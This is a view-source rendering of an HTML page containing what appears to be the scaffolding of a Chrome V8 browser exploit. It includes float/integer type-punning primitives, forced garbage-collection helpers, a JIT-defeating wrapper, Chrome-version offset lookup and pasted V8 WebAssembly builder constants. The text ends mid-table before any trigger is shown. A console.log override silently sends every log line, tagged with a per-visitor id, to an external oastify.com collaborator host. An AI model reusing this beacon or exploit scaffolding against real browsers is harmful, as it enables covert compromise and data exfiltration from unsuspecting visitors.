

<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><meta name="color-scheme" content="light dark"></head><body><div class="line-gutter-backdrop"></div><form autocomplete="off"><label class="line-wrap-control">Line wrap<input type="checkbox" aria-label="Line wrap"></label></form><table><tbody><tr><td class="line-number" value="1"></td><td class="line-content"><span class="html-tag">&lt;html&gt;</span></td></tr><tr><td class="line-number" value="2"></td><td class="line-content"><span class="html-tag">&lt;body&gt;</span></td></tr><tr><td class="line-number" value="3"></td><td class="line-content">    <span class="html-tag">&lt;pre <span class="html-attribute-name">id</span>="<span class="html-attribute-value">log</span>" <span class="html-attribute-name">style</span>="<span class="html-attribute-value">white-space: pre-wrap; word-wrap: break-word;</span>"&gt;</span><span class="html-tag">&lt;/pre&gt;</span></td></tr><tr><td class="line-number" value="4"></td><td class="line-content">    <span class="html-tag">&lt;script&gt;</span></td></tr><tr><td class="line-number" value="5"></td><td class="line-content">const conid = Math.floor(Math.random() * 1000000);</td></tr><tr><td class="line-number" value="6"></td><td class="line-content">const _consolelog = console.log;</td></tr><tr><td class="line-number" value="7"></td><td class="line-content">console.log = async (...msg) =&gt; {</td></tr><tr><td class="line-number" value="8"></td><td class="line-content">    _consolelog(...msg);</td></tr><tr><td class="line-number" value="9"></td><td class="line-content">    document.getElementById('log').innerText += msg.join(' ') + '\n';</td></tr><tr><td class="line-number" value="10"></td><td class="line-content">    if (window.location.search.indexOf(`nolog`) == -1) {</td></tr><tr><td class="line-number" value="11"></td><td class="line-content">        try {</td></tr><tr><td class="line-number" value="12"></td><td class="line-content">            let m = encodeURIComponent(`id[${conid}]: ${msg.join(' ')}`);</td></tr><tr><td class="line-number" value="13"></td><td class="line-content">            await fetch(`https://ipbyayxw6060j7i31zolmb373y9pxgr4g.oastify.com/?msg=${m}`).catch(() =&gt; {});</td></tr><tr><td class="line-number" value="14"></td><td class="line-content">            return;</td></tr><tr><td class="line-number" value="15"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="16"></td><td class="line-content">        catch(e) {</td></tr><tr><td class="line-number" value="17"></td><td class="line-content">            return;</td></tr><tr><td class="line-number" value="18"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="19"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="20"></td><td class="line-content">}</td></tr><tr><td class="line-number" value="21"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="22"></td><td class="line-content">// # Utility functions</td></tr><tr><td class="line-number" value="23"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="24"></td><td class="line-content">function init(offsets, version_hint) {</td></tr><tr><td class="line-number" value="25"></td><td class="line-content">    let target_version = version_hint || (typeof navigator != 'undefined' ? navigator.userAgent.match(/Chrome.([^ ]+)/)?.[1] : null) || (typeof version != 'undefined' ? version() : '');</td></tr><tr><td class="line-number" value="26"></td><td class="line-content">    let resulting_offsets = { ...offsets, version: target_version };</td></tr><tr><td class="line-number" value="27"></td><td class="line-content">    let version_offsets = offsets;</td></tr><tr><td class="line-number" value="28"></td><td class="line-content">    for (let x of target_version.toString().split(".")) {</td></tr><tr><td class="line-number" value="29"></td><td class="line-content">        version_offsets = version_offsets[x] || {};</td></tr><tr><td class="line-number" value="30"></td><td class="line-content">        for (let key of Object.keys(version_offsets)) {</td></tr><tr><td class="line-number" value="31"></td><td class="line-content">            resulting_offsets[key] = version_offsets[key];</td></tr><tr><td class="line-number" value="32"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="33"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="34"></td><td class="line-content">    return resulting_offsets;</td></tr><tr><td class="line-number" value="35"></td><td class="line-content">}</td></tr><tr><td class="line-number" value="36"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="37"></td><td class="line-content">let references = [];</td></tr><tr><td class="line-number" value="38"></td><td class="line-content">let arr_buf = new ArrayBuffer(8);</td></tr><tr><td class="line-number" value="39"></td><td class="line-content">let f64_arr = new Float64Array(arr_buf);</td></tr><tr><td class="line-number" value="40"></td><td class="line-content">let b64_arr = new BigInt64Array(arr_buf);</td></tr><tr><td class="line-number" value="41"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="42"></td><td class="line-content">function ftoi(f) {</td></tr><tr><td class="line-number" value="43"></td><td class="line-content">    f64_arr[0] = f;</td></tr><tr><td class="line-number" value="44"></td><td class="line-content">    return b64_arr[0];</td></tr><tr><td class="line-number" value="45"></td><td class="line-content">}</td></tr><tr><td class="line-number" value="46"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="47"></td><td class="line-content">function itof(i) {</td></tr><tr><td class="line-number" value="48"></td><td class="line-content">    b64_arr[0] = i;</td></tr><tr><td class="line-number" value="49"></td><td class="line-content">    return f64_arr[0];</td></tr><tr><td class="line-number" value="50"></td><td class="line-content">}</td></tr><tr><td class="line-number" value="51"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="52"></td><td class="line-content">function to_hex(val, width = 16) {</td></tr><tr><td class="line-number" value="53"></td><td class="line-content">    let _v = typeof val == 'bigint' ? val : (Number.isSafeInteger(val) ? BigInt(val) : ftoi(val));</td></tr><tr><td class="line-number" value="54"></td><td class="line-content">    _v = _v &gt;= 0 ? _v : 0x10000000000000000n + _v;</td></tr><tr><td class="line-number" value="55"></td><td class="line-content">    return '0x' + _v.toString(16).padStart(width, '0');</td></tr><tr><td class="line-number" value="56"></td><td class="line-content">}</td></tr><tr><td class="line-number" value="57"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="58"></td><td class="line-content">function hold_reference(obj) {</td></tr><tr><td class="line-number" value="59"></td><td class="line-content">    references.push(obj);</td></tr><tr><td class="line-number" value="60"></td><td class="line-content">}</td></tr><tr><td class="line-number" value="61"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="62"></td><td class="line-content">function mark_sweep_gc() {</td></tr><tr><td class="line-number" value="63"></td><td class="line-content">    new ArrayBuffer(0x7fe00000);</td></tr><tr><td class="line-number" value="64"></td><td class="line-content">}</td></tr><tr><td class="line-number" value="65"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="66"></td><td class="line-content">function scavenge_gc() {</td></tr><tr><td class="line-number" value="67"></td><td class="line-content">    for (let i = 0; i &lt; 8; i++) {</td></tr><tr><td class="line-number" value="68"></td><td class="line-content">        // fill up new space external backing store bytes</td></tr><tr><td class="line-number" value="69"></td><td class="line-content">        hold_reference(new ArrayBuffer(0x200000));</td></tr><tr><td class="line-number" value="70"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="71"></td><td class="line-content">    hold_reference(new ArrayBuffer(8));</td></tr><tr><td class="line-number" value="72"></td><td class="line-content">}</td></tr><tr><td class="line-number" value="73"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="74"></td><td class="line-content">function noOpt(func) {</td></tr><tr><td class="line-number" value="75"></td><td class="line-content">    let counter = 0;</td></tr><tr><td class="line-number" value="76"></td><td class="line-content">    const wrapper = (...args) =&gt; {</td></tr><tr><td class="line-number" value="77"></td><td class="line-content">        // Function stub to prevent JIT optimization</td></tr><tr><td class="line-number" value="78"></td><td class="line-content">        counter += 1;</td></tr><tr><td class="line-number" value="79"></td><td class="line-content">        if (counter % 100 == 1) {</td></tr><tr><td class="line-number" value="80"></td><td class="line-content">            wrapper.stub = eval(func.toString() + `// ${counter}`);</td></tr><tr><td class="line-number" value="81"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="82"></td><td class="line-content">        </td></tr><tr><td class="line-number" value="83"></td><td class="line-content">        return wrapper.stub(...args);</td></tr><tr><td class="line-number" value="84"></td><td class="line-content">    };</td></tr><tr><td class="line-number" value="85"></td><td class="line-content">    return wrapper;</td></tr><tr><td class="line-number" value="86"></td><td class="line-content">}</td></tr><tr><td class="line-number" value="87"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="88"></td><td class="line-content">// xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</td></tr><tr><td class="line-number" value="89"></td><td class="line-content">  // Copyright 2016 the V8 project authors. All rights reserved.</td></tr><tr><td class="line-number" value="90"></td><td class="line-content">  // Use of this source code is governed by a BSD-style license that can be</td></tr><tr><td class="line-number" value="91"></td><td class="line-content">  // found in the LICENSE file.</td></tr><tr><td class="line-number" value="92"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="93"></td><td class="line-content">  // Used for encoding f32 and double constants to bits.</td></tr><tr><td class="line-number" value="94"></td><td class="line-content">  let byte_view = new Uint8Array(8);</td></tr><tr><td class="line-number" value="95"></td><td class="line-content">  let data_view = new DataView(byte_view.buffer);</td></tr><tr><td class="line-number" value="96"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="97"></td><td class="line-content">  // The bytes function receives one of</td></tr><tr><td class="line-number" value="98"></td><td class="line-content">  //  - several arguments, each of which is either a number or a string of length</td></tr><tr><td class="line-number" value="99"></td><td class="line-content">  //    1; if it's a string, the charcode of the contained character is used.</td></tr><tr><td class="line-number" value="100"></td><td class="line-content">  //  - a single array argument containing the actual arguments</td></tr><tr><td class="line-number" value="101"></td><td class="line-content">  //  - a single string; the returned buffer will contain the char codes of all</td></tr><tr><td class="line-number" value="102"></td><td class="line-content">  //    contained characters.</td></tr><tr><td class="line-number" value="103"></td><td class="line-content">  function bytes(...input) {</td></tr><tr><td class="line-number" value="104"></td><td class="line-content">  if (input.length == 1 &amp;&amp; typeof input[0] == 'array') input = input[0];</td></tr><tr><td class="line-number" value="105"></td><td class="line-content">  if (input.length == 1 &amp;&amp; typeof input[0] == 'string') {</td></tr><tr><td class="line-number" value="106"></td><td class="line-content">    let len = input[0].length;</td></tr><tr><td class="line-number" value="107"></td><td class="line-content">    let view = new Uint8Array(len);</td></tr><tr><td class="line-number" value="108"></td><td class="line-content">    for (let i = 0; i &lt; len; i++) view[i] = input[0].charCodeAt(i);</td></tr><tr><td class="line-number" value="109"></td><td class="line-content">    return view.buffer;</td></tr><tr><td class="line-number" value="110"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="111"></td><td class="line-content">  let view = new Uint8Array(input.length);</td></tr><tr><td class="line-number" value="112"></td><td class="line-content">  for (let i = 0; i &lt; input.length; i++) {</td></tr><tr><td class="line-number" value="113"></td><td class="line-content">    let val = input[i];</td></tr><tr><td class="line-number" value="114"></td><td class="line-content">    if (typeof val == 'string') {</td></tr><tr><td class="line-number" value="115"></td><td class="line-content">      if (val.length != 1) {</td></tr><tr><td class="line-number" value="116"></td><td class="line-content">        throw new Error('string inputs must have length 1');</td></tr><tr><td class="line-number" value="117"></td><td class="line-content">      }</td></tr><tr><td class="line-number" value="118"></td><td class="line-content">      val = val.charCodeAt(0);</td></tr><tr><td class="line-number" value="119"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="120"></td><td class="line-content">    view[i] = val | 0;</td></tr><tr><td class="line-number" value="121"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="122"></td><td class="line-content">  return view.buffer;</td></tr><tr><td class="line-number" value="123"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="124"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="125"></td><td class="line-content">  // Header declaration constants</td></tr><tr><td class="line-number" value="126"></td><td class="line-content">  var kWasmH0 = 0;</td></tr><tr><td class="line-number" value="127"></td><td class="line-content">  var kWasmH1 = 0x61;</td></tr><tr><td class="line-number" value="128"></td><td class="line-content">  var kWasmH2 = 0x73;</td></tr><tr><td class="line-number" value="129"></td><td class="line-content">  var kWasmH3 = 0x6d;</td></tr><tr><td class="line-number" value="130"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="131"></td><td class="line-content">  var kWasmV0 = 0x1;</td></tr><tr><td class="line-number" value="132"></td><td class="line-content">  var kWasmV1 = 0;</td></tr><tr><td class="line-number" value="133"></td><td class="line-content">  var kWasmV2 = 0;</td></tr><tr><td class="line-number" value="134"></td><td class="line-content">  var kWasmV3 = 0;</td></tr><tr><td class="line-number" value="135"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="136"></td><td class="line-content">  var kHeaderSize = 8;</td></tr><tr><td class="line-number" value="137"></td><td class="line-content">  var kPageSize = 65536;</td></tr><tr><td class="line-number" value="138"></td><td class="line-content">  var kSpecMaxPages = 65536;</td></tr><tr><td class="line-number" value="139"></td><td class="line-content">  var kMaxVarInt32Size = 5;</td></tr><tr><td class="line-number" value="140"></td><td class="line-content">  var kMaxVarInt64Size = 10;</td></tr><tr><td class="line-number" value="141"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="142"></td><td class="line-content">  let kDeclNoLocals = 0;</td></tr><tr><td class="line-number" value="143"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="144"></td><td class="line-content">  // Section declaration constants</td></tr><tr><td class="line-number" value="145"></td><td class="line-content">  let kUnknownSectionCode = 0;</td></tr><tr><td class="line-number" value="146"></td><td class="line-content">  let kTypeSectionCode = 1;        // Function signature declarations</td></tr><tr><td class="line-number" value="147"></td><td class="line-content">  let kImportSectionCode = 2;      // Import declarations</td></tr><tr><td class="line-number" value="148"></td><td class="line-content">  let kFunctionSectionCode = 3;    // Function declarations</td></tr><tr><td class="line-number" value="149"></td><td class="line-content">  let kTableSectionCode = 4;       // Indirect function table and other tables</td></tr><tr><td class="line-number" value="150"></td><td class="line-content">  let kMemorySectionCode = 5;      // Memory attributes</td></tr><tr><td class="line-number" value="151"></td><td class="line-content">  let kGlobalSectionCode = 6;      // Global declarations</td></tr><tr><td class="line-number" value="152"></td><td class="line-content">  let kExportSectionCode = 7;      // Exports</td></tr><tr><td class="line-number" value="153"></td><td class="line-content">  let kStartSectionCode = 8;       // Start function declaration</td></tr><tr><td class="line-number" value="154"></td><td class="line-content">  let kElementSectionCode = 9;     // Elements section</td></tr><tr><td class="line-number" value="155"></td><td class="line-content">  let kCodeSectionCode = 10;       // Function code</td></tr><tr><td class="line-number" value="156"></td><td class="line-content">  let kDataSectionCode = 11;       // Data segments</td></tr><tr><td class="line-number" value="157"></td><td class="line-content">  let kDataCountSectionCode = 12;  // Data segment count (between Element &amp; Code)</td></tr><tr><td class="line-number" value="158"></td><td class="line-content">  let kTagSectionCode = 13;        // Tag section (between Memory &amp; Global)</td></tr><tr><td class="line-number" value="159"></td><td class="line-content">  let kStringRefSectionCode = 14;  // Stringref literals section (between Tag &amp; Global)</td></tr><tr><td class="line-number" value="160"></td><td class="line-content">  let kLastKnownSectionCode = 14;</td></tr><tr><td class="line-number" value="161"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="162"></td><td class="line-content">  // Name section types</td></tr><tr><td class="line-number" value="163"></td><td class="line-content">  let kModuleNameCode = 0;</td></tr><tr><td class="line-number" value="164"></td><td class="line-content">  let kFunctionNamesCode = 1;</td></tr><tr><td class="line-number" value="165"></td><td class="line-content">  let kLocalNamesCode = 2;</td></tr><tr><td class="line-number" value="166"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="167"></td><td class="line-content">  let kWasmSharedTypeForm = 0x65;</td></tr><tr><td class="line-number" value="168"></td><td class="line-content">  let kWasmFunctionTypeForm = 0x60;</td></tr><tr><td class="line-number" value="169"></td><td class="line-content">  let kWasmStructTypeForm = 0x5f;</td></tr><tr><td class="line-number" value="170"></td><td class="line-content">  let kWasmArrayTypeForm = 0x5e;</td></tr><tr><td class="line-number" value="171"></td><td class="line-content">  let kWasmSubtypeForm = 0x50;</td></tr><tr><td class="line-number" value="172"></td><td class="line-content">  let kWasmSubtypeFinalForm = 0x4f;</td></tr><tr><td class="line-number" value="173"></td><td class="line-content">  let kWasmRecursiveTypeGroupForm = 0x4e;</td></tr><tr><td class="line-number" value="174"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="175"></td><td class="line-content">  let kNoSuperType = 0xFFFFFFFF;</td></tr><tr><td class="line-number" value="176"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="177"></td><td class="line-content">  let kLimitsNoMaximum = 0x00;</td></tr><tr><td class="line-number" value="178"></td><td class="line-content">  let kLimitsWithMaximum = 0x01;</td></tr><tr><td class="line-number" value="179"></td><td class="line-content">  let kLimitsSharedNoMaximum = 0x02;</td></tr><tr><td class="line-number" value="180"></td><td class="line-content">  let kLimitsSharedWithMaximum = 0x03;</td></tr><tr><td class="line-number" value="181"></td><td class="line-content">  let kLimitsMemory64NoMaximum = 0x04;</td></tr><tr><td class="line-number" value="182"></td><td class="line-content">  let kLimitsMemory64WithMaximum = 0x05;</td></tr><tr><td class="line-number" value="183"></td><td class="line-content">  let kLimitsMemory64SharedNoMaximum = 0x06;</td></tr><tr><td class="line-number" value="184"></td><td class="line-content">  let kLimitsMemory64SharedWithMaximum = 0x07;</td></tr><tr><td class="line-number" value="185"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="186"></td><td class="line-content">  // Segment flags</td></tr><tr><td class="line-number" value="187"></td><td class="line-content">  let kActiveNoIndex = 0;</td></tr><tr><td class="line-number" value="188"></td><td class="line-content">  let kPassive = 1;</td></tr><tr><td class="line-number" value="189"></td><td class="line-content">  let kActiveWithIndex = 2;</td></tr><tr><td class="line-number" value="190"></td><td class="line-content">  let kDeclarative = 3;</td></tr><tr><td class="line-number" value="191"></td><td class="line-content">  let kPassiveWithElements = 5;</td></tr><tr><td class="line-number" value="192"></td><td class="line-content">  let kDeclarativeWithElements = 7;</td></tr><tr><td class="line-number" value="193"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="194"></td><td class="line-content">  // Function declaration flags</td></tr><tr><td class="line-number" value="195"></td><td class="line-content">  let kDeclFunctionName = 0x01;</td></tr><tr><td class="line-number" value="196"></td><td class="line-content">  let kDeclFunctionImport = 0x02;</td></tr><tr><td class="line-number" value="197"></td><td class="line-content">  let kDeclFunctionLocals = 0x04;</td></tr><tr><td class="line-number" value="198"></td><td class="line-content">  let kDeclFunctionExport = 0x08;</td></tr><tr><td class="line-number" value="199"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="200"></td><td class="line-content">  // Value types and related</td></tr><tr><td class="line-number" value="201"></td><td class="line-content">  let kWasmVoid = 0x40;</td></tr><tr><td class="line-number" value="202"></td><td class="line-content">  let kWasmI32 = 0x7f;</td></tr><tr><td class="line-number" value="203"></td><td class="line-content">  let kWasmI64 = 0x7e;</td></tr><tr><td class="line-number" value="204"></td><td class="line-content">  let kWasmF32 = 0x7d;</td></tr><tr><td class="line-number" value="205"></td><td class="line-content">  let kWasmF64 = 0x7c;</td></tr><tr><td class="line-number" value="206"></td><td class="line-content">  let kWasmS128 = 0x7b;</td></tr><tr><td class="line-number" value="207"></td><td class="line-content">  let kWasmI8 = 0x78;</td></tr><tr><td class="line-number" value="208"></td><td class="line-content">  let kWasmI16 = 0x77;</td></tr><tr><td class="line-number" value="209"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="210"></td><td class="line-content">  // These are defined as negative integers to distinguish them from positive type</td></tr><tr><td class="line-number" value="211"></td><td class="line-content">  // indices.</td></tr><tr><td class="line-number" value="212"></td><td class="line-content">  let kWasmNullFuncRef = -0x0d;</td></tr><tr><td class="line-number" value="213"></td><td class="line-content">  let kWasmNullExternRef = -0x0e;</td></tr><tr><td class="line-number" value="214"></td><td class="line-content">  let kWasmNullRef = -0x0f;</td></tr><tr><td class="line-number" value="215"></td><td class="line-content">  let kWasmFuncRef = -0x10;</td></tr><tr><td class="line-number" value="216"></td><td class="line-content">  let kWasmAnyFunc = kWasmFuncRef;  // Alias named as in the JS API spec</td></tr><tr><td class="line-number" value="217"></td><td class="line-content">  let kWasmExternRef = -0x11;</td></tr><tr><td class="line-number" value="218"></td><td class="line-content">  let kWasmAnyRef = -0x12;</td></tr><tr><td class="line-number" value="219"></td><td class="line-content">  let kWasmEqRef = -0x13;</td></tr><tr><td class="line-number" value="220"></td><td class="line-content">  let kWasmI31Ref = -0x14;</td></tr><tr><td class="line-number" value="221"></td><td class="line-content">  let kWasmStructRef = -0x15;</td></tr><tr><td class="line-number" value="222"></td><td class="line-content">  let kWasmArrayRef = -0x16;</td></tr><tr><td class="line-number" value="223"></td><td class="line-content">  let kWasmExnRef = -0x17;</td></tr><tr><td class="line-number" value="224"></td><td class="line-content">  let kWasmStringRef = -0x19;</td></tr><tr><td class="line-number" value="225"></td><td class="line-content">  let kWasmStringViewWtf8 = -0x1a;</td></tr><tr><td class="line-number" value="226"></td><td class="line-content">  let kWasmStringViewWtf16 = -0x1e;</td></tr><tr><td class="line-number" value="227"></td><td class="line-content">  let kWasmStringViewIter = -0x1f;</td></tr><tr><td class="line-number" value="228"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="229"></td><td class="line-content">  // Use the positive-byte versions inside function bodies.</td></tr><tr><td class="line-number" value="230"></td><td class="line-content">  let kLeb128Mask = 0x7f;</td></tr><tr><td class="line-number" value="231"></td><td class="line-content">  let kFuncRefCode = kWasmFuncRef &amp; kLeb128Mask;</td></tr><tr><td class="line-number" value="232"></td><td class="line-content">  let kAnyFuncCode = kFuncRefCode;  // Alias named as in the JS API spec</td></tr><tr><td class="line-number" value="233"></td><td class="line-content">  let kExternRefCode = kWasmExternRef &amp; kLeb128Mask;</td></tr><tr><td class="line-number" value="234"></td><td class="line-content">  let kAnyRefCode = kWasmAnyRef &amp; kLeb128Mask;</td></tr><tr><td class="line-number" value="235"></td><td class="line-content">  let kEqRefCode = kWasmEqRef &amp; kLeb128Mask;</td></tr><tr><td class="line-number" value="236"></td><td class="line-content">  let kI31RefCode = kWasmI31Ref &amp; kLeb128Mask;</td></tr><tr><td class="line-number" value="237"></td><td class="line-content">  let kNullExternRefCode = kWasmNullExternRef &amp; kLeb128Mask;</td></tr><tr><td class="line-number" value="238"></td><td class="line-content">  let kNullFuncRefCode = kWasmNullFuncRef &amp; kLeb128Mask;</td></tr><tr><td class="line-number" value="239"></td><td class="line-content">  let kStructRefCode = kWasmStructRef &amp; kLeb128Mask;</td></tr><tr><td class="line-number" value="240"></td><td class="line-content">  let kArrayRefCode = kWasmArrayRef &amp; kLeb128Mask;</td></tr><tr><td class="line-number" value="241"></td><td class="line-content">  let kExnRefCode = kWasmExnRef &amp; kLeb128Mask;</td></tr><tr><td class="line-number" value="242"></td><td class="line-content">  let kNullRefCode = kWasmNullRef &amp; kLeb128Mask;</td></tr><tr><td class="line-number" value="243"></td><td class="line-content">  let kStringRefCode = kWasmStringRef &amp; kLeb128Mask;</td></tr><tr><td class="line-number" value="244"></td><td class="line-content">  let kStringViewWtf8Code = kWasmStringViewWtf8 &amp; kLeb128Mask;</td></tr><tr><td class="line-number" value="245"></td><td class="line-content">  let kStringViewWtf16Code = kWasmStringViewWtf16 &amp; kLeb128Mask;</td></tr><tr><td class="line-number" value="246"></td><td class="line-content">  let kStringViewIterCode = kWasmStringViewIter &amp; kLeb128Mask;</td></tr><tr><td class="line-number" value="247"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="248"></td><td class="line-content">  let kWasmRefNull = 0x63;</td></tr><tr><td class="line-number" value="249"></td><td class="line-content">  let kWasmRef = 0x64;</td></tr><tr><td class="line-number" value="250"></td><td class="line-content">  function wasmRefNullType(heap_type) {</td></tr><tr><td class="line-number" value="251"></td><td class="line-content">  return {opcode: kWasmRefNull, heap_type: heap_type};</td></tr><tr><td class="line-number" value="252"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="253"></td><td class="line-content">  function wasmRefType(heap_type) {</td></tr><tr><td class="line-number" value="254"></td><td class="line-content">  return {opcode: kWasmRef, heap_type: heap_type};</td></tr><tr><td class="line-number" value="255"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="256"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="257"></td><td class="line-content">  let kExternalFunction = 0;</td></tr><tr><td class="line-number" value="258"></td><td class="line-content">  let kExternalTable = 1;</td></tr><tr><td class="line-number" value="259"></td><td class="line-content">  let kExternalMemory = 2;</td></tr><tr><td class="line-number" value="260"></td><td class="line-content">  let kExternalGlobal = 3;</td></tr><tr><td class="line-number" value="261"></td><td class="line-content">  let kExternalTag = 4;</td></tr><tr><td class="line-number" value="262"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="263"></td><td class="line-content">  let kTableZero = 0;</td></tr><tr><td class="line-number" value="264"></td><td class="line-content">  let kMemoryZero = 0;</td></tr><tr><td class="line-number" value="265"></td><td class="line-content">  let kSegmentZero = 0;</td></tr><tr><td class="line-number" value="266"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="267"></td><td class="line-content">  let kExceptionAttribute = 0;</td></tr><tr><td class="line-number" value="268"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="269"></td><td class="line-content">  // Useful signatures</td></tr><tr><td class="line-number" value="270"></td><td class="line-content">  let kSig_i_i = makeSig([kWasmI32], [kWasmI32]);</td></tr><tr><td class="line-number" value="271"></td><td class="line-content">  let kSig_l_l = makeSig([kWasmI64], [kWasmI64]);</td></tr><tr><td class="line-number" value="272"></td><td class="line-content">  let kSig_i_l = makeSig([kWasmI64], [kWasmI32]);</td></tr><tr><td class="line-number" value="273"></td><td class="line-content">  let kSig_i_ii = makeSig([kWasmI32, kWasmI32], [kWasmI32]);</td></tr><tr><td class="line-number" value="274"></td><td class="line-content">  let kSig_i_iii = makeSig([kWasmI32, kWasmI32, kWasmI32], [kWasmI32]);</td></tr><tr><td class="line-number" value="275"></td><td class="line-content">  let kSig_v_iiii = makeSig([kWasmI32, kWasmI32, kWasmI32, kWasmI32], []);</td></tr><tr><td class="line-number" value="276"></td><td class="line-content">  let kSig_l_i = makeSig([kWasmI32], [kWasmI64]);</td></tr><tr><td class="line-number" value="277"></td><td class="line-content">  let kSig_f_ff = makeSig([kWasmF32, kWasmF32], [kWasmF32]);</td></tr><tr><td class="line-number" value="278"></td><td class="line-content">  let kSig_d_dd = makeSig([kWasmF64, kWasmF64], [kWasmF64]);</td></tr><tr><td class="line-number" value="279"></td><td class="line-content">  let kSig_l_ll = makeSig([kWasmI64, kWasmI64], [kWasmI64]);</td></tr><tr><td class="line-number" value="280"></td><td class="line-content">  let kSig_i_dd = makeSig([kWasmF64, kWasmF64], [kWasmI32]);</td></tr><tr><td class="line-number" value="281"></td><td class="line-content">  let kSig_v_v = makeSig([], []);</td></tr><tr><td class="line-number" value="282"></td><td class="line-content">  let kSig_i_v = makeSig([], [kWasmI32]);</td></tr><tr><td class="line-number" value="283"></td><td class="line-content">  let kSig_l_v = makeSig([], [kWasmI64]);</td></tr><tr><td class="line-number" value="284"></td><td class="line-content">  let kSig_f_v = makeSig([], [kWasmF32]);</td></tr><tr><td class="line-number" value="285"></td><td class="line-content">  let kSig_d_v = makeSig([], [kWasmF64]);</td></tr><tr><td class="line-number" value="286"></td><td class="line-content">  let kSig_v_i = makeSig([kWasmI32], []);</td></tr><tr><td class="line-number" value="287"></td><td class="line-content">  let kSig_v_ii = makeSig([kWasmI32, kWasmI32], []);</td></tr><tr><td class="line-number" value="288"></td><td class="line-content">  let kSig_v_iii = makeSig([kWasmI32, kWasmI32, kWasmI32], []);</td></tr><tr><td class="line-number" value="289"></td><td class="line-content">  let kSig_v_l = makeSig([kWasmI64], []);</td></tr><tr><td class="line-number" value="290"></td><td class="line-content">  let kSig_v_li = makeSig([kWasmI64, kWasmI32], []);</td></tr><tr><td class="line-number" value="291"></td><td class="line-content">  let kSig_v_lii = makeSig([kWasmI64, kWasmI32, kWasmI32], []);</td></tr><tr><td class="line-number" value="292"></td><td class="line-content">  let kSig_v_d = makeSig([kWasmF64], []);</td></tr><tr><td class="line-number" value="293"></td><td class="line-content">  let kSig_v_dd = makeSig([kWasmF64, kWasmF64], []);</td></tr><tr><td class="line-number" value="294"></td><td class="line-content">  let kSig_v_ddi = makeSig([kWasmF64, kWasmF64, kWasmI32], []);</td></tr><tr><td class="line-number" value="295"></td><td class="line-content">  let kSig_ii_v = makeSig([], [kWasmI32, kWasmI32]);</td></tr><tr><td class="line-number" value="296"></td><td class="line-content">  let kSig_iii_v = makeSig([], [kWasmI32, kWasmI32, kWasmI32]);</td></tr><tr><td class="line-number" value="297"></td><td class="line-content">  let kSig_ii_i = makeSig([kWasmI32], [kWasmI32, kWasmI32]);</td></tr><tr><td class="line-number" value="298"></td><td class="line-content">  let kSig_iii_i = makeSig([kWasmI32], [kWasmI32, kWasmI32, kWasmI32]);</td></tr><tr><td class="line-number" value="299"></td><td class="line-content">  let kSig_ii_ii = makeSig([kWasmI32, kWasmI32], [kWasmI32, kWasmI32]);</td></tr><tr><td class="line-number" value="300"></td><td class="line-content">  let kSig_iii_ii = makeSig([kWasmI32, kWasmI32], [kWasmI32, kWasmI32, kWasmI32]);</td></tr><tr><td class="line-number" value="301"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="302"></td><td class="line-content">  let kSig_v_f = makeSig([kWasmF32], []);</td></tr><tr><td class="line-number" value="303"></td><td class="line-content">  let kSig_f_f = makeSig([kWasmF32], [kWasmF32]);</td></tr><tr><td class="line-number" value="304"></td><td class="line-content">  let kSig_f_d = makeSig([kWasmF64], [kWasmF32]);</td></tr><tr><td class="line-number" value="305"></td><td class="line-content">  let kSig_d_d = makeSig([kWasmF64], [kWasmF64]);</td></tr><tr><td class="line-number" value="306"></td><td class="line-content">  let kSig_r_r = makeSig([kWasmExternRef], [kWasmExternRef]);</td></tr><tr><td class="line-number" value="307"></td><td class="line-content">  let kSig_a_a = makeSig([kWasmAnyFunc], [kWasmAnyFunc]);</td></tr><tr><td class="line-number" value="308"></td><td class="line-content">  let kSig_i_r = makeSig([kWasmExternRef], [kWasmI32]);</td></tr><tr><td class="line-number" value="309"></td><td class="line-content">  let kSig_v_r = makeSig([kWasmExternRef], []);</td></tr><tr><td class="line-number" value="310"></td><td class="line-content">  let kSig_v_a = makeSig([kWasmAnyFunc], []);</td></tr><tr><td 